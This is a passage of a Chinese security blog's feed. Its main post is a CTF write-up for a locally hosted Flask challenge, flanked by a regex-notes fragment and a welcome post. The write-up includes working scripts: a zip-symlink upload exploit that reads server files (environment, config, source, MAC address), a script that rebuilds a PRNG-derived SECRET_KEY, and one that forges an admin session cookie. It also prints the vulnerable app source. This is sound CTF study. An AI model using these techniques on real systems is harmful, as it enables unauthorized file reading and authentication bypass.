非强制出现的参数，包含1个字符的字符串，表示希望用在pattern参数的分隔符</p><p><strong>返回值</strong></p><p>preg_quote返回一个字符串，它是input的副本，其中的正则表达式元字符进行了转义，如果指定了分隔符，则分隔符本身也会被转义。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;起因是最近做一道文件包含的ctf题目时，卡了很久，最后才发现是对正则表达式的理解有问题导致，害，太菜了，最后反思了一下还是没有好好学习正则表达式（尤其是没有系统的进行学习），于是决定系统的学习一下正则表达式。&lt;/p&gt;
&lt;p&gt;本次学习使用的学习资料为《精通正则表达式(第三版)</summary>
      
    
    
    
    <category term="基础学习" scheme="http://fxizenta.github.io/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="正则表达式" scheme="http://fxizenta.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>一道flask的wp</title>
    <link href="http://fxizenta.github.io/2021/03/01/awp_for_falsk/"/>
    <id>http://fxizenta.github.io/2021/03/01/awp_for_falsk/</id>
    <published>2021-03-01T08:24:46.000Z</published>
    <updated>2021-03-03T05:01:24.547Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一道flask的wp"><a href="#一道flask的wp" class="headerlink" title="一道flask的wp"></a>一道flask的wp</h1><p>本题为校内一个师兄出的题，在本地搭好了环境进行试验。</p><h2 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a><strong>第一步</strong></h2><p>进入题目发现一个上传点和提示“I will tell you a secret, but you should become admin first.”，根据提示可以猜想到得先想办法以admin身份登录，查看cookie可以看到session，值为疑似base64的一串字符串，decode之后为类似{“username”:”2333”}的信息，应该使用的是securecookie机制，如果能够得到签名的key和签名方法等相关信息就能想办法伪造session，接下来的思路是一样的，就是想办法先拿到源码。</p><p><img src="https://i.loli.net/2021/03/02/akT8L3im6Sbphr2.jpg" alt="awp_falsk1.jpg"></p><h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a><strong>第二步</strong></h2><p>测试上传点，发现只能上传zip文件，并返回zip解压后的文件内容。尝试压缩软链接上传，发现会回显对应的文件内容，这样就实现了一个任意文件下载，通过这个可以开始想办法找到源码的路径，我们要用到上传zipfile读取到<code>SECRET_KEY</code>，然后伪造admin的session进行登录。</p><p><img src="https://i.loli.net/2021/03/02/QkSH5WdNi8yUCqE.jpg" alt="awp_falsk2.jpg"></p><h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><p>接下来主要目标是获取源码</p><p>脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://xxxx/upload&#x27;</span></span><br><span class="line">def makezip():</span><br><span class="line">    os.system(<span class="string">&#x27;ln -s &#x27;</span>+sys.argv[1]+<span class="string">&#x27; exp&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">&#x27;zip --symlinks exp.zip exp&#x27;</span>)</span><br><span class="line">makezip()</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">&#x27;the_file&#x27;</span>:open(<span class="string">&#x27;./exp.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">def exploit():</span><br><span class="line">    res = requests.post(url,files=files)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line">exploit()</span><br><span class="line">os.system(<span class="string">&#x27;rm -rf exp&#x27;</span>)</span><br><span class="line">os.system(<span class="string">&#x27;rm -rf exp.zip&#x27;</span>)</span><br></pre></td></tr></table></figure><p>如果对linux比较了解应该会知道 <code>/proc</code>目录 ，然后通过 <code>/proc/self/environ</code>的软链接 来获得flask的环境变量，环境变量中可以找到配置文件路径和一些信息</p><p><img src="https://i.loli.net/2021/03/02/h5J8X9jNV6Hq4p1.jpg" alt="awp_falsk3.jpg"></p><p>整理一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">UWSGI_ORIGINAL_PROC_NAME=/usr/<span class="built_in">local</span>/bin/uwsgi</span><br><span class="line">SUPERVISOR_GROUP_NAME=uwsgi</span><br><span class="line">HOSTNAME=5a000ec609dc</span><br><span class="line">PYTHON_PIP_VERSION=20.1</span><br><span class="line">HOME=/root</span><br><span class="line">GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D</span><br><span class="line">UWSGI_INI=/app/y0u_found_it.ini</span><br><span class="line">NGINX_MAX_UPLOAD=0</span><br><span class="line">UWSGI_PROCESSES=16</span><br><span class="line">STATIC_URL=/static</span><br><span class="line">PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/1fe530e9e3d800be94e04f6428460fc4fb94f5a9/get-pip.py</span><br><span class="line">UWSGI_CHEAPER=2</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/bin:/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">LANG=C.UTF-8</span><br><span class="line">SUPERVISOR_ENABLED=1</span><br><span class="line">PYTHON_VERSION=3.6.10</span><br><span class="line">NGINX_WORKER_PROCESSES=auto</span><br><span class="line">SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock</span><br><span class="line">SUPERVISOR_PROCESS_NAME=uwsgi</span><br><span class="line">LISTEN_PORT=80</span><br><span class="line">STATIC_INDEX=0</span><br><span class="line">PWD=/app/y0u_found_it</span><br><span class="line">PYTHON_GET_PIP_SHA256=ce486cddac44e99496a702aa5c06c5028414ef48fdfd5242cd2fe559b13d4348</span><br><span class="line">STATIC_PATH=/app/static</span><br><span class="line">PYTHONPATH=/app</span><br><span class="line">UWSGI_RELOADS=0</span><br></pre></td></tr></table></figure><h2 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h2><p>扫一眼过去，能够发现一项<code>UWSGI_INI</code>，以INI结尾，应该是个配置文件 ，而且从命名来看</p><p>”y0u_found_it.ini“已经在提示这个ini文件有问题，那么接下来 构造软链接，生成zip，上传读取。<br>得到<code>/app/ y0u_found_it.ini</code>内容</p><p><img src="https://i.loli.net/2021/03/02/v7ilWwXUahBEFoL.jpg" alt="awp_falsk4.jpg"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">module = y0u_found_it.y0u_found_it_main</span><br><span class="line">callable=app</span><br></pre></td></tr></table></figure><p>这样就找到了源代码路径<code>/app/y0u_found_it/y0u_found_it_main.py</code></p><p>接下来获取源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = <span class="built_in">set</span>([<span class="string">&#x27;zip&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span>(<span class="params">filename</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    error = request.args.get(<span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, forbidden=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, user=session[<span class="string">&#x27;username&#x27;</span>], secret=secret.secret)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;the_file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    file = request.files[<span class="string">&#x27;the_file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;This file already exists&#x27;</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;This file is not a zipfile&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        os.system(<span class="string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="string">&#x27; -d &#x27;</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">&#x27;cat &#x27;</span> + extract_path + <span class="string">&#x27;/*&#x27;</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">&#x27;rm -rf &#x27;</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">&#x27;ZmxhZw==&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) != -<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">10008</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a><strong>第五步</strong></h2><p>查看代码发现secret=secret.secret，可以知道flag应该是在<code>secret.py</code>文件里，如果软链接直接读取 ，发现还是提示<code>you are not admin</code> ，所以还是得按照前面的分析 通过找<code>SECRET_KEY</code> 来解决，因为 python random生成的数不是真正的随机数，而是伪随机数，利用伪随机数的特性，只要种子是一样的，后面产生的随机数值也是一致的。</p><p>查看代码可知通过<code>uuid.getnode()</code>函数 获取网卡mac地址并转换成十进制数返回 ，那么思路就变成了先获取服务器的网卡mac地址来确定种子，进而确定<code>SECRET_KEY</code>，从而伪造<code>session</code></p><p>因为linux中一切都是文件，所以可以通过读<code>/sys/class/net/eth0/address</code>文件得到mac地址</p><p>然后 把mac地址处理下，转换成10进制，然后设置成seed，生成 <code>SECRET_KEY</code>，下面是脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;mac&quot;</span></span><br><span class="line">sss = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">sss = [<span class="built_in">int</span>(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> sss]</span><br><span class="line">sss = [<span class="built_in">bin</span>(i).replace(<span class="string">&#x27;0b&#x27;</span>,<span class="string">&#x27;&#x27;</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> sss]</span><br><span class="line">sss = <span class="string">&#x27;&#x27;</span>.join(sss)</span><br><span class="line">mac = <span class="built_in">int</span>(sss,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = <span class="built_in">str</span>(random.random()*<span class="number">100</span>)</span><br><span class="line">print(randStr)</span><br></pre></td></tr></table></figure><p>这里另外一个师傅给出了另外一个简介版本，当时写的时候就觉得上面那个有点复杂了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">&quot;mac&quot;</span></span><br><span class="line">sss = mac.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">sss = <span class="string">&#x27;&#x27;</span>.join(sss)</span><br><span class="line">mac = <span class="built_in">eval</span>(<span class="string">&quot;0x&quot;</span>+sss)</span><br><span class="line">print(mac)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a><strong>第六步</strong></h2><p>接下来就是通过key获取admin的session，这里是通过flask-session-cookie-manager脚本获取</p><p><img src="https://i.loli.net/2021/03/02/P4zwVnSjak2ClQ5.jpg" alt="awp_falsk5.jpg"></p><p>session成功伪造，获得flag</p><p><img src="https://i.loli.net/2021/03/02/sz2d16LKrAVwOXZ.jpg" alt="awp_falsk6.jpg"></p><p>exp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_file</span>(<span class="params">file_name</span>):</span></span><br><span class="line">  link(file_name)</span><br><span class="line">  files = &#123;<span class="string">&#x27;the_file&#x27;</span>: <span class="built_in">open</span>(file_name[-<span class="number">5</span>:] + <span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)&#125;</span><br><span class="line">  r2 = s.post(url+<span class="string">&#x27;upload&#x27;</span>, files=files)</span><br><span class="line">  <span class="keyword">return</span> r2.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">link</span>(<span class="params">file_name</span>):</span></span><br><span class="line">  os.system(<span class="string">&#x27;ln -s &#123;file_name&#125; &#123;output&#125;&#x27;</span>.<span class="built_in">format</span>(file_name = file_name, output = file_name[-<span class="number">5</span>:]))</span><br><span class="line">  os.system(<span class="string">&#x27;zip -y -m &#123;output&#125;.zip &#123;output&#125;&#x27;</span>.<span class="built_in">format</span>(file_name = file_name, output = file_name[-<span class="number">5</span>:]))</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://xxxxxx/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> s:</span><br><span class="line">  en = read_file(<span class="string">&#x27;/proc/self/environ&#x27;</span>)</span><br><span class="line">  ini = re.search(<span class="string">&#x27;UWSGI_INI=(.*?)\x00&#x27;</span>, en).group(<span class="number">1</span>)</span><br><span class="line">  pwd = re.search(<span class="string">&#x27;PWD=(.*?)\x00&#x27;</span>, en).group(<span class="number">1</span>)</span><br><span class="line">  ini = read_file(ini)</span><br><span class="line">  source = re.search(<span class="string">&#x27;module = .*?\.(.*?)\n&#x27;</span>, ini).group(<span class="number">1</span>)</span><br><span class="line">  source = pwd+<span class="string">&#x27;/&#x27;</span>+source+<span class="string">&#x27;.py&#x27;</span></span><br><span class="line">  source = read_file(source)</span><br><span class="line">  <span class="keyword">if</span>(source.find(<span class="string">&#x27;import&#x27;</span>) == -<span class="number">1</span>):</span><br><span class="line">​    exit(<span class="string">&#x27;fail&#x27;</span>)</span><br><span class="line">  mac = <span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span></span><br><span class="line">  mac = read_file(mac)</span><br><span class="line">  mac = mac[:-<span class="number">1</span>]</span><br><span class="line">  mac = <span class="string">&#x27;&#x27;</span>.join(mac.split(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line">  mac = <span class="built_in">int</span>(mac, <span class="number">16</span>)</span><br><span class="line">  random.seed(mac)</span><br><span class="line">  key = random.random()*<span class="number">100</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(key)</span><br><span class="line">payload = &#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line">session = serializer.dumps(payload)</span><br><span class="line">cookies = &#123;<span class="string">&#x27;session&#x27;</span>: session&#125;</span><br><span class="line">r = requests.get(url, cookies=cookies)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一道flask的wp&quot;&gt;&lt;a href=&quot;#一道flask的wp&quot; class=&quot;headerlink&quot; title=&quot;一道flask的wp&quot;&gt;&lt;/a&gt;一道flask的wp&lt;/h1&gt;&lt;p&gt;本题为校内一个师兄出的题，在本地搭好了环境进行试验。&lt;/p&gt;
&lt;h2 id=</summary>
      
    
    
    
    <category term="web" scheme="http://fxizenta.github.io/categories/web/"/>
    
    
    <category term="flask" scheme="http://fxizenta.github.io/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>Hello</title>
    <link href="http://fxizenta.github.io/2021/01/24/hello-world/"/>
    <id>http://fxizenta.github.io/2021/01/24/hello-world/</id>
    <published>2021-01-23T16:00:00.000Z</published>
    <updated>2021-03-03T04:11:30.208Z</updated>
    
    <content type="html"><![CDATA[<p>本博客创建于2021年1月24日，用于分享以及记录学习笔记。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本博客创建于2021年1月24日，用于分享以及记录学习笔记。&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
